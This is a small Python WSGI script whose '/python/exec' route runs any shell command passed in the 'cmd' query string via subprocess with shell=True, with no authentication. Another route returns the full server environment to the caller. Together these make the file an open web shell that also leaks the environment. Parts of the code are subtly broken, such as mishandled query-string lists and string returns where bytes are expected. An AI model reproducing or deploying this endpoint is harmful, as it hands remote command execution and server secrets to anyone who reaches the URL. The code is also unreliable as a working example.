import os
import sys
import subprocess
import urllib.parse as urlparse

def application(environ, start_response):

    status = '200 OK'
    headers = [('Content-type', 'text/plain; charset=utf-8')]

    start_response(status, headers)

    msg = ''
    msg_error = 'msg'   

    output = []
    for key, value in environ.items():
        output.append(f"{key}: {value}\n".encode('utf-8'))  # 格式化输出并编码为字节串

    # return output    
    
    #ret = [("%s: %s\n" % (key, value)).encode("utf-8")
    # for key, value in urlparse.parse_qs(environ['QUERY_STRING']).items()]

    if environ['SCRIPT_URL'] == '/python/':
        ret = [("%s: %s\n" % (key, value)).encode("utf-8")
           for key, value in environ.items()]
        
        return ret

    elif environ['SCRIPT_URL'] == '/python/info/':
        return "Hello, World!"

    elif environ['SCRIPT_URL'] == '/python/exec':
        pq = urlparse.parse_qs(environ['QUERY_STRING'])
        cmd = pq.get('cmd', '')

        if pq.get('cmd', '') == '' :
            return "No command!"

        try:
            ps = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

            msg_error = ps.stderr.read()
            msg = ps.stdout.read()

            exc_code = ps.wait()

            ret = msg
        except Exception as e:
            ret =  "error with build:{0}".format(str(e))

        return ret
    else:
        return "Not found!"
